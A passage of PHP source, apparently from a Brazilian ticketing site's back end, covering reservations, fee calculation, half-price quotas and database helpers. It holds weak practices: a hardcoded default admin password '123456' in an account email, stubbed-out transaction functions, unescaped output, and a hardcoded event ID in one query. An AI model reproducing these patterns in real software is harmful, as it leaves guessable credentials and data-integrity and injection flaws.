<?php

function getSiteLogo() {
    echo "<img src='../images/menu_logo.jpg' height='60px' id='logo' />";
}

function getSiteName() {
    echo "<h1 class='siteName'>$nomeSite</h1>";
}

/*  PEDIDOS  */

function tempoRestante($stamp = false) {
    $mainConnection = mainConnection();
    $query = 'SELECT TOP 1
				 CONVERT(VARCHAR(10), DT_VALIDADE, 103) DATA,  CONVERT(VARCHAR(8), DT_VALIDADE, 108) HORA
				 FROM MW_RESERVA
				 WHERE ID_SESSION = ?
				 ORDER BY DT_VALIDADE';
    $params = array(session_id());
    $rs = executeSQL($mainConnection, $query, $params, true);

    if ($stamp) {
	return $rs['DATA'] . ' - ' . $rs['HORA'];
    } else {
	$data = explode('/', $rs['DATA']);
	$hora = explode(':', $rs['HORA']);

	if (($data[1] - 1) < 0) {
	    $retorno = '(new Date().getTime() + 3000)';
	} else {
	    $retorno = $data[2] . ',' . ($data[1] - 1) . ',' . $data[0] . ',' . $hora[0] . ',' . $hora[1] . ',' . $hora[2];
	}

	return $retorno;
    }
}

function extenderTempo($min = NULL) {
    require_once('../settings/settings.php');

    if ($min != NULL) {
	$compraExpireTime = $min;
    }

    $mainConnection = mainConnection();
    $query = 'UPDATE MW_RESERVA SET
				 DT_VALIDADE = DATEADD(MI, ?, GETDATE())
				 WHERE ID_SESSION = ?';
    $params = array($compraExpireTime, session_id());

    $result = executeSQL($mainConnection, $query, $params) ? 'true' : 'false';

    return $result;
}

function verificarLimitePorCPF($conn, $codApresentacao, $user) {
    $mainConnection = mainConnection();

    if (isset($user)) {
	$rs = executeSQL($mainConnection, 'SELECT CD_CPF FROM MW_CLIENTE WHERE ID_CLIENTE = ?', array($user), true);
	$cpf = $rs[0];

	$query = 'SELECT (
						 SELECT ISNULL(QT_INGRESSOS_POR_CPF, 0)
						 FROM TABAPRESENTACAO A
						 INNER JOIN TABPECA P ON P.CODPECA = A.CODPECA
						 WHERE A.CODAPRESENTACAO = ?
					 ) AS QT_INGRESSOS_POR_CPF, (
						 SELECT SUM(CASE H.CODTIPLANCAMENTO WHEN 1 THEN 1 ELSE -1 END)
						 FROM TABCLIENTE C
						 INNER JOIN TABHISCLIENTE H ON H.CODIGO = C.CODIGO AND H.CODAPRESENTACAO = 1878
						 WHERE C.CPF = ?
					 ) AS QTDVENDIDO';
	$result = executeSQL($conn, $query, array($codApresentacao, $cpf));

	if (hasRows($result)) {
	    $rs = fetchResult($result);
	    if ($rs['QT_INGRESSOS_POR_CPF'] != 0 and $rs['QT_INGRESSOS_POR_CPF'] <= $rs['QTDVENDIDO']) {
		return 'Caro Sr(a)., este evento permite apenas ' . $rs['QT_INGRESSOS_POR_CPF'] . '
						ingresso(s) por CPF. Seu saldo para compras é de ' . ($rs['QT_INGRESSOS_POR_CPF'] - $rs['QTDVENDIDO']) . '
						ingresso(s).';
	    }
	}
    }
    return NULL;
}

function obterValorServico($id_bilhete, $valor_pedido = false, $id_pedido = null) {

	$mainConnection = mainConnection();
        session_start();
	if ($id_pedido != null) {
            $query = 'SELECT TOP 1
                        TC.IN_TAXA_POR_PEDIDO,
                        PV.VL_TOTAL_TAXA_CONVENIENCIA,
                        TC.IN_COBRAR_PDV
                      FROM
                        MW_TAXA_CONVENIENCIA TC
                      INNER JOIN MW_PEDIDO_VENDA PV ON PV.DT_PEDIDO_VENDA >= TC.DT_INICIO_VIGENCIA
                      INNER JOIN MW_ITEM_PEDIDO_VENDA IPV ON IPV.ID_PEDIDO_VENDA = PV.ID_PEDIDO_VENDA
                      INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = IPV.ID_APRESENTACAO
                        AND A.ID_EVENTO = TC.ID_EVENTO
                      WHERE
                        PV.ID_PEDIDO_VENDA = ?
                      ORDER BY
                        TC.DT_INICIO_VIGENCIA DESC';
            $params = array($id_pedido);
            $rs = executeSQL($mainConnection, $query, $params, true);

            if ($rs['IN_TAXA_POR_PEDIDO'] == 'S') {
                    return $valor_pedido ? number_format($rs['VL_TOTAL_TAXA_CONVENIENCIA'], 2) : 0;
            }

            $query = 'SELECT TOP 1 VL_TAXA_CONVENIENCIA FROM MW_ITEM_PEDIDO_VENDA WHERE ID_PEDIDO_VENDA = ? AND ID_APRESENTACAO_BILHETE = ?';
            $params = array($id_pedido, $id_bilhete);
            $rs = executeSQL($mainConnection, $query, $params, true);

            $valor = ($_SESSION['usuario_pdv'] == 1) ? ($rs['IN_COBRAR_PDV'] == 'S') ? $rs['VL_TAXA_CONVENIENCIA'] : 0 : $rs['VL_TAXA_CONVENIENCIA'];
	} else {                        
            $query = 'SELECT
                        E.ID_BASE,
                        E.ID_EVENTO
                      FROM
                        MW_EVENTO E
                      INNER JOIN MW_APRESENTACAO A ON A.ID_EVENTO = E.ID_EVENTO
                      INNER JOIN MW_APRESENTACAO_BILHETE B ON B.ID_APRESENTACAO = A.ID_APRESENTACAO
                      WHERE
                        B.ID_APRESENTACAO_BILHETE = ?';
            $params = array($id_bilhete);
            $rs = executeSQL($mainConnection, $query, $params, true);

            $id_base = $rs['ID_BASE'];
            $id_evento = $rs['ID_EVENTO'];

            $query = 'SELECT TOP 1
                        VL_TAXA_CONVENIENCIA,
                        IN_TAXA_CONVENIENCIA,
                        VL_TAXA_PROMOCIONAL,
                        IN_TAXA_POR_PEDIDO,
                        VL_TAXA_UM_INGRESSO,
                        VL_TAXA_UM_INGRESSO_PROMOCIONAL,
                        IN_COBRAR_PDV
                      FROM
                        MW_TAXA_CONVENIENCIA
                      WHERE
                        ID_EVENTO = ? AND DT_INICIO_VIGENCIA <= GETDATE()
                      ORDER BY
                        DT_INICIO_VIGENCIA DESC';
            $params = array($id_evento);
            $rs = executeSQL($mainConnection, $query, $params, true);

            $tipo = $rs['IN_TAXA_CONVENIENCIA'];
            $normal = $rs['VL_TAXA_CONVENIENCIA'];
            $promo = $rs['VL_TAXA_PROMOCIONAL'];
            $vl_um_ingresso = $rs['VL_TAXA_UM_INGRESSO'];
            $vl_um_ingresso_promo = $rs['VL_TAXA_UM_INGRESSO_PROMOCIONAL'];
            $taxa_por_pedido = $rs['IN_TAXA_POR_PEDIDO'];
            $is_cobrar_pdv = $rs['IN_COBRAR_PDV'];

            $conn = getConnection($id_base);

            $query = 'SELECT
                        AB.VL_LIQUIDO_INGRESSO,
                        PC.ID_PROMOCAO_CONTROLE
                      FROM
                        CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB
                      LEFT JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = AB.CODTIPBILHETE
                      LEFT JOIN CI_MIDDLEWAY..MW_PROMOCAO_CONTROLE PC ON PC.ID_PROMOCAO_CONTROLE = TTB.ID_PROMOCAO_CONTROLE
                      	AND PC.IN_ATIVO = 1 AND PC.CODTIPPROMOCAO = 4
                      WHERE
                        AB.IN_ATIVO = 1
                        AND AB.ID_APRESENTACAO_BILHETE = ?';
            $params = array($id_bilhete);
            $rs = executeSQL($conn, $query, $params, true);

            $quantidade = executeSQL($mainConnection, 'SELECT COUNT(1) AS INGRESSOS FROM MW_RESERVA WHERE ID_SESSION = ?', array(session_id()), true);

            if ($taxa_por_pedido == 'S') {
                if ($tipo == 'V') {
                    $valor = $valor_pedido ? ($quantidade['INGRESSOS'] == 1 ? $vl_um_ingresso : $normal) : 0;
                } else {
                    $valor = $valor_pedido ? number_format(($quantidade['INGRESSOS'] == 1 ? ($vl_um_ingresso / 100) * $rs['VL_LIQUIDO_INGRESSO'] : obterValorPercentualServicoPorPedido()), 2) : 0;
                }
            } else {
                $valor = $tipo == 'V'
                                ? ($quantidade['INGRESSOS'] == 1 ? (is_null($rs['ID_PROMOCAO_CONTROLE']) ? $vl_um_ingresso : $vl_um_ingresso_promo) : (is_null($rs['ID_PROMOCAO_CONTROLE']) ? $normal : $promo))
                                : (($quantidade['INGRESSOS'] == 1 ? (is_null($rs['ID_PROMOCAO_CONTROLE']) ? $vl_um_ingresso : $vl_um_ingresso_promo) : (is_null($rs['ID_PROMOCAO_CONTROLE']) ? $normal : $promo)) / 100) * $rs['VL_LIQUIDO_INGRESSO'];
            }

            if( isset($_SESSION['usuario_pdv']) and $_SESSION['usuario_pdv'] == 1 ){
                if($is_cobrar_pdv == 'N'){
                    $valor = 0;
                }
            }

	}
	return number_format($valor, 2);
}

function obterValorPercentualServicoPorPedido() {

	$mainConnection = mainConnection();
	session_start();
	$soma = 0;

	$query = 'SELECT R.ID_APRESENTACAO_BILHETE, E.ID_BASE, TC.VL_TAXA_CONVENIENCIA, TC.VL_TAXA_PROMOCIONAL
				FROM MW_RESERVA R
				INNER JOIN MW_APRESENTACAO A ON R.ID_APRESENTACAO = A.ID_APRESENTACAO
				INNER JOIN MW_EVENTO E ON A.ID_EVENTO = E.ID_EVENTO
				INNER JOIN MW_TAXA_CONVENIENCIA TC ON TC.ID_EVENTO = E.ID_EVENTO
					AND TC.DT_INICIO_VIGENCIA = (SELECT MAX(DT_INICIO_VIGENCIA) FROM MW_TAXA_CONVENIENCIA TC2 WHERE TC2.ID_EVENTO = TC.ID_EVENTO AND TC2.DT_INICIO_VIGENCIA <= GETDATE())
				WHERE R.ID_SESSION = ? AND R.DT_VALIDADE >= GETDATE()';
	$params = array(session_id());
	$result = executeSQL($mainConnection, $query, $params);

	while ($rs = fetchResult($result)) {
		$id_bilhete = $rs['ID_APRESENTACAO_BILHETE'];
		$normal = $rs['VL_TAXA_CONVENIENCIA'];
		$promo = $rs['VL_TAXA_PROMOCIONAL'];
		$conn = getConnection($rs['ID_BASE']);

		$query = 'SELECT AB.VL_LIQUIDO_INGRESSO, PC.ID_PROMOCAO_CONTROLE
					FROM CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB
                      LEFT JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = AB.CODTIPBILHETE
                      LEFT JOIN CI_MIDDLEWAY..MW_PROMOCAO_CONTROLE PC ON PC.ID_PROMOCAO_CONTROLE = TTB.ID_PROMOCAO_CONTROLE
                      	AND PC.IN_ATIVO = 1 AND PC.CODTIPPROMOCAO = 4
					WHERE AB.IN_ATIVO = 1
					AND AB.ID_APRESENTACAO_BILHETE = ?';
		$params = array($id_bilhete);
		$rs = executeSQL($conn, $query, $params, true);

		$soma += (is_null($rs['ID_PROMOCAO_CONTROLE']) ? ($normal / 100) * $rs['VL_LIQUIDO_INGRESSO'] : ($promo / 100) * $rs['VL_LIQUIDO_INGRESSO']);
	}

	return $soma;
}

function enviarEmailNovaConta ($login, $nome, $email) {

	$subject = 'Aviso de Acesso';
	$from = 'contato@compreingressos.com';
	$namefrom = 'COMPREINGRESSOS.COM - AGENCIA DE VENDA DE INGRESSOS';

	//define the body of the message.
	ob_start(); //Turn on output buffering
?>
<p>&nbsp;</p>
<div style="background-color: rgb(255, 255, 255); padding-top: 5px; padding-right: 5px; padding-bottom: 5px; padding-left: 5px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; ">
<p style="text-align: left; font-family: Arial, Verdana, sans-serif; font-size: 12px; ">&nbsp;<img alt="" src="http://www.compreingressos.com/images/logo_compre_2015.jpg" /><span style="font-family: Verdana; "><strong>GEST&Atilde;O E ADMINISTRA&Ccedil;&Atilde;O DE INGRESSOS</strong></span></p>
<h3 style="font-family: Arial, Verdana, sans-serif; font-size: 12px; "><strong>&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;</strong><strong>NOTIFICA&Ccedil;&Atilde;O&nbsp;DE&nbsp;ACESSO</strong></h3>
<h2 style="margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">Ol&aacute;,&nbsp;</span><span style="color: rgb(181, 9, 56); "><span style="font-size: smaller; "><span style="font-family: Verdana, sans-serif; "><?php echo $nome; ?></span></span></span><span style="font-size: medium; "><span style="font-family: Verdana; "><strong><span><br />
</span></strong></span></span></h2>
<p style="text-align: left; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 97, 97); "><span style="font-family: Verdana; "><span style="font-size: 10pt; ">Conta de acesso administrativo.</span></span></span><br />
&nbsp;</p>
<p style="text-align: left; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 97, 97); "><span style="font-family: Verdana; "><span style="font-size: 10pt; ">Para efetuar o login voc&ecirc; deve utilizar as seguintes informa&ccedil;&otilde;es:</span></span></span></p>
<p style="text-align: left; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><em><span style="font-size: small; "><span style="color: rgb(97, 97, 98); "><span style="font-family: Verdana, sans-serif; ">
<ul>
	<li>URL: <a href="https://compra.compreingressos.com/admin/">https://compra.compreingressos.com/admin/</a></li>
	<li>Usu&aacute;rio: <?php echo $login; ?></li>
	<li>Senha: 123456</li>
</ul>
</span></span></span></em></p>
<div style="line-height: normal; margin-left: 40px; "><strong><em><?php echo $novaSenha; ?></em></strong></div>
<p style="text-align: left; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><em><span style="font-size: small; "><span style="color: rgb(97, 97, 98); "><span style="font-family: Verdana, sans-serif; ">obs-Ap&oacute;s o pr&oacute;ximo acesso o sistema solicitar&aacute; a troca da senha.</span></span></span></em></p>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">&nbsp;</span></div>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Atenciosamente</span></div>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; ">&nbsp;</div>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COMPREINGRESSOS.COM&nbsp;&nbsp;</span><span style="color: rgb(98, 98, 97); ">11 2122 4070</span></div>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
<div style="line-height: normal; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="font-family: Verdana, sans-serif; font-size: 8pt; ">&nbsp;</span><span style="font-family: Verdana, sans-serif; font-size: 8pt; "><br />
</span></div>
<p style="margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); "><span style="font-size: smaller; ">Esse &eacute; um e-mail autom&aacute;tico. N&atilde;o &eacute; necess&aacute;rio respond&ecirc;-lo.</span></span></p>
</div>
<p>&nbsp;</p>
<?php
	//copy current buffer contents into $message variable and delete current output buffer
	$message = ob_get_clean();
	return authSendEmail($from, $namefrom, $email, $nome, $subject, $message);
}

function getTotalMeiaEntrada ($apresentacao) {
	$mainConnection = mainConnection();
	$total = 0;

	$query = 'SELECT e.id_base
				from mw_evento e
				inner join mw_apresentacao a on e.id_evento = a.id_evento
				where a.id_apresentacao = ?';
	$rs = executeSQL($mainConnection, $query, array($apresentacao), true);

	$conn = getConnection($rs['id_base']);

	$query = "SELECT StaCalculoMeiaEstudante, CotaMeiaEstudante, StaCalculoPorSala
				from tabTipBilhete
				where StaTipBilhMeiaEstudante = 'S' and StaTipBilhete = 'A'
				and CodTipBilhete in (select CodTipBilhete from ci_middleway..mw_apresentacao_bilhete where id_apresentacao = ? AND IN_ATIVO = 1)";
	$rs = executeSQL($conn, $query, array($apresentacao), true);

	if ($rs['StaCalculoMeiaEstudante'] == 'P') {
		if ($rs['StaCalculoPorSala'] == 'S') {
			$query = "SELECT COALESCE(COUNT(tsd.Indice), 0) as TOTAL FROM tabSalDetalhe tsd
						INNER JOIN tabApresentacao ta ON ta.CodSala = tsd.CodSala
						INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CodApresentacao = ta.CodApresentacao
						WHERE A.ID_APRESENTACAO = ? AND A.IN_ATIVO = 1 AND tsd.TipObjeto <> 'I'";
			$params = array($apresentacao);
		} else {
			$query = "SELECT COALESCE(COUNT(tsd.Indice), 0) as TOTAL FROM tabSalDetalhe tsd
						INNER JOIN tabApresentacao ta ON ta.CodSala = tsd.CodSala
						INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CodApresentacao = ta.CodApresentacao
						WHERE A.ID_EVENTO = (SELECT ID_EVENTO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
						AND A.DT_APRESENTACAO = (SELECT DT_APRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
						AND A.HR_APRESENTACAO = (SELECT HR_APRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
						AND A.IN_ATIVO = 1
						AND tsd.TipObjeto <> 'I'";
			$params = array($apresentacao, $apresentacao, $apresentacao);
		}
		
		$rs2 = executeSQL($conn, $query, $params, true);

		$total = ceil($rs2['TOTAL'] * ($rs['CotaMeiaEstudante'] / 100));
	} else if ($rs['StaCalculoMeiaEstudante'] == 'Q') {
		$total = $rs['CotaMeiaEstudante'];
	}

	return $total;
}

function getTotalMeiaEntradaDisponivel ($apresentacao) {
	$mainConnection = mainConnection();
	$total = 0;

	$query = 'SELECT e.id_base
				from mw_evento e
				inner join mw_apresentacao a on e.id_evento = a.id_evento
				where a.id_apresentacao = ?';
	$rs = executeSQL($mainConnection, $query, array($apresentacao), true);

	$conn = getConnection($rs['id_base']);

	$query = "SELECT StaCalculoPorSala
				from tabTipBilhete
				where StaTipBilhMeiaEstudante = 'S' and StaTipBilhete = 'A'
				and CodTipBilhete in (select CodTipBilhete from ci_middleway..mw_apresentacao_bilhete where id_apresentacao = ?)";
	$rs = executeSQL($conn, $query, array($apresentacao), true);

	if ($rs['StaCalculoPorSala'] == 'S') {
		$query = "SELECT COALESCE(COUNT(TLS.INDICE),0) AS TOTAL FROM TABLUGSALA TLS
					INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CODAPRESENTACAO = TLS.CODAPRESENTACAO
					INNER JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = TLS.CODTIPBILHETE
					WHERE TLS.CODAPRESENTACAO IN (SELECT CODAPRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = A.ID_APRESENTACAO AND IN_ATIVO = 1)
					AND TLS.CODTIPBILHETE IN (SELECT CODTIPBILHETE FROM CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE WHERE ID_APRESENTACAO = A.ID_APRESENTACAO AND IN_ATIVO = 1)
					AND TTB.STATIPBILHMEIAESTUDANTE = 'S' AND TTB.STATIPBILHETE = 'A' AND A.ID_APRESENTACAO = ? AND TLS.CODVENDACOMPLMEIA IS NULL";
		$params = array($apresentacao);
	} else {
		$query = "SELECT COALESCE(COUNT(TLS.INDICE),0) AS TOTAL FROM TABLUGSALA TLS
					INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CODAPRESENTACAO = TLS.CODAPRESENTACAO
					INNER JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = TLS.CODTIPBILHETE
					WHERE A.ID_EVENTO = (SELECT ID_EVENTO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
					AND A.DT_APRESENTACAO = (SELECT DT_APRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
					AND A.HR_APRESENTACAO = (SELECT HR_APRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
					AND A.IN_ATIVO = 1
					AND TLS.CODAPRESENTACAO IN (SELECT CODAPRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = A.ID_APRESENTACAO AND IN_ATIVO = 1)
					AND TLS.CODTIPBILHETE IN (SELECT CODTIPBILHETE FROM CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE WHERE ID_APRESENTACAO = A.ID_APRESENTACAO AND IN_ATIVO = 1)
					AND TTB.STATIPBILHMEIAESTUDANTE = 'S' AND TTB.STATIPBILHETE = 'A' AND TLS.CODVENDACOMPLMEIA IS NULL";
		$params = array($apresentacao, $apresentacao, $apresentacao);
	}
	
	$rs = executeSQL($conn, $query, $params, true);

	return getTotalMeiaEntrada($apresentacao) - $rs['TOTAL'];
}

function getCaixaTotalMeiaEntrada($apresentacao) {
	$mainConnection = mainConnection();

	$query = 'SELECT e.id_base
				from mw_evento e
				inner join mw_apresentacao a on e.id_evento = a.id_evento
				where a.id_apresentacao = ?';
	$rs = executeSQL($mainConnection, $query, array($apresentacao), true);

	$conn = getConnection($rs['id_base']);

	$query = "SELECT StaCalculoPorSala
				from tabTipBilhete
				where StaTipBilhMeiaEstudante = 'S' and StaTipBilhete = 'A'
				and CodTipBilhete in (select CodTipBilhete from ci_middleway..mw_apresentacao_bilhete where id_apresentacao = ? and in_ativo = 1)";
	$rs = executeSQL($conn, $query, array($apresentacao), true);

	if ($rs['StaCalculoPorSala'] == 'S') {
		$t = getTotalMeiaEntradaDisponivel($apresentacao);
		//$t = $t < 0 ? 0 : $t;

		$html = "<p><strong>Lei da meia-entrada</strong></p>

				<p>Existem <span class='contagem-meia'>" . $t . "</span> de <span>" . getTotalMeiaEntrada($apresentacao) . "</span> ingressos disponíveis para meia-entrada de estudantes.</p>";
	} else {
		$html = '';
	}

	return $html;
}

function getTotalLote ($bilhete) {
	$mainConnection = mainConnection();
	$total = 0;

	$query = 'SELECT e.id_base
				from mw_evento e
				inner join mw_apresentacao a on e.id_evento = a.id_evento
				inner join mw_apresentacao_bilhete ab on ab.id_apresentacao = a.id_apresentacao
				where ab.id_apresentacao_bilhete = ?';
	$rs = executeSQL($mainConnection, $query, array($bilhete), true);

	$conn = getConnection($rs['id_base']);

	$query = "SELECT ttb.QtdVendaPorLote
				from tabTipBilhete ttb
				inner join ci_middleway..mw_apresentacao_bilhete ab on ab.CodTipBilhete = ttb.CodTipBilhete
				where ttb.QTDVENDAPORLOTE > 0 and ttb.StaTipBilhMeiaEstudante = 'N' and ttb.StaTipBilhete = 'A'
				and ab.id_apresentacao_bilhete = ? and ab.IN_ATIVO = 1";
	$rs = executeSQL($conn, $query, array($bilhete), true);

	return $rs['QtdVendaPorLote'];
}

function getTotalLoteDisponivel ($bilhete) {
	$mainConnection = mainConnection();
	$total = 0;

	$query = 'SELECT e.id_base, A.ID_EVENTO, A.DT_APRESENTACAO, A.HR_APRESENTACAO, AB.CODTIPBILHETE
				from mw_evento e
				inner join mw_apresentacao a on e.id_evento = a.id_evento
				inner join mw_apresentacao_bilhete ab on ab.id_apresentacao = a.id_apresentacao
				where ab.id_apresentacao_bilhete = ?';
	$rs = executeSQL($mainConnection, $query, array($bilhete), true);

	$conn = getConnection($rs['id_base']);
	
	$query = "SELECT COALESCE(COUNT(TLS.INDICE),0) AS TOTAL FROM TABLUGSALA TLS
				INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CODAPRESENTACAO = TLS.CODAPRESENTACAO
				INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB ON AB.ID_APRESENTACAO = A.ID_APRESENTACAO AND TLS.CODTIPBILHETE = AB.CODTIPBILHETE
				INNER JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = AB.CODTIPBILHETE
				WHERE A.ID_EVENTO = ? AND A.DT_APRESENTACAO = ? AND A.HR_APRESENTACAO = ?
				AND A.IN_ATIVO = 1 AND AB.IN_ATIVO = 1 AND TTB.CODTIPBILHETE = ?
				AND TTB.QTDVENDAPORLOTE > 0 AND TTB.STATIPBILHMEIAESTUDANTE = 'N' AND TTB.STATIPBILHETE = 'A'";
	$params = array($bilhete);
	$rs = executeSQL($conn, $query, array($rs['ID_EVENTO'], $rs['DT_APRESENTACAO']->format('Ymd'), $rs['HR_APRESENTACAO'], $rs['CODTIPBILHETE']), true);

	return getTotalLote($bilhete) - $rs['TOTAL'];
}

function getURLApresentacaoAtual() {
	$mainConnection = mainConnection();

	$query = 'SELECT A.ID_APRESENTACAO, E.DS_EVENTO
				from mw_evento e
				inner join mw_apresentacao a on e.id_evento = a.id_evento
				inner join mw_reserva r on r.id_apresentacao = a.id_apresentacao
				where r.id_session = ?';
	$rs = executeSQL($mainConnection, $query, array(session_id()), true);

	return 'etapa1.php?apresentacao='.$rs['ID_APRESENTACAO'].'&eventoDS='.utf8_encode($rs['DS_EVENTO']);
}





/*  BANCO  */



require_once('../settings/mainConnections.php');

function sqlErrors($index = NULL) {
    $retorno = sqlsrv_errors();

    return (($index == NULL) ? $retorno : $retorno[0][$index]);
}

function beginTransaction($conn) {
    return null;//sqlsrv_begin_transaction($conn);
}

function commitTransaction($conn) {
    return null;//sqlsrv_commit($conn);
}

function rollbackTransaction($conn) {
    return null;//sqlsrv_rollback($conn);
}

function executeSQL($conn, $strSql, $params = array(), $returnRs = false) {
    if (empty($params)) {
	$result = sqlsrv_query($conn, $strSql);
    } else {
	$result = sqlsrv_query($conn, $strSql, $params);
    }

    if ($returnRs) {
	return fetchResult($result);
    } else {
	return $result;
    }
}

function fetchResult($result, $fetchType = SQLSRV_FETCH_BOTH) {
    return sqlsrv_fetch_array($result, $fetchType);
}

function numRows($conn, $strSql, $params = array()) {
    if (empty($params)) {
	$result = sqlsrv_query($conn, $strSql, $params, array("Scrollable" => SQLSRV_CURSOR_KEYSET));
    } else {
	$result = sqlsrv_query($conn, $strSql, $params, array("Scrollable" => SQLSRV_CURSOR_KEYSET));
    }
    return sqlsrv_num_rows($result);
}

function hasRows($result, $returnNum = false) {
    if ($returnNum) {
	return sqlsrv_num_rows($result);
    } else {
	return sqlsrv_has_rows($result);
    }
}

/*  COMBOS  */

function comboRegiaoGeografica($name) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_REGIAO_GEOGRAFICA, DS_REGIAO_GEOGRAFICA FROM MW_REGIAO_GEOGRAFICA');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma regi&atilde;o...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_REGIAO_GEOGRAFICA'] . '">' . utf8_encode($rs['DS_REGIAO_GEOGRAFICA']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboEvento($name, $teatro, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_EVENTO, DS_EVENTO FROM MW_EVENTO WHERE ID_BASE = ? AND IN_ATIVO = \'1\' ORDER BY DS_EVENTO', array($teatro));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_EVENTO'] . '"' .
		(($selected == $rs['ID_EVENTO']) ? ' selected' : '') .
		'>' . str_replace("'", "\'", utf8_encode($rs['DS_EVENTO'])) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboEventoPermissao($name, $params, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT E.ID_EVENTO, E.DS_EVENTO
                                            FROM MW_EVENTO E
                                            INNER JOIN MW_ACESSO_CONCEDIDO AC ON AC.ID_USUARIO = ? AND AC.ID_BASE = E.ID_BASE AND AC.CODPECA = E.CODPECA
                                            WHERE E.ID_BASE = ? AND E.IN_ATIVO = \'1\'', $params);
    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento...</option>';

    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_EVENTO'] . '"' .
		(($selected == $rs['ID_EVENTO']) ? ' selected' : '') .
		'>' . utf8_encode($rs['DS_EVENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboEstado($name, $selected, $extenso = false, $isCombo = true, $extraProp = '', $shortText = false) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_ESTADO, ' . (($extenso) ? 'DS_ESTADO' : 'SG_ESTADO') . ' FROM MW_ESTADO';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '" ' . $extraProp . '><option value="">'.($shortText ? 'UF' : 'Selecione um estado...').'</option>';
    while ($rs = fetchResult($result)) {
	if (($selected == $rs['ID_ESTADO'])) {
	    $isSelected = 'selected';
	    $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]) . '</span>';
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_ESTADO'] . '"' . $isSelected . '>' . utf8_encode($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboEstadoOptions($name, $selected, $extenso = false, $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_ESTADO, ' . (($extenso) ? 'DS_ESTADO' : 'SG_ESTADO') . ' FROM MW_ESTADO ORDER BY DS_ESTADO';
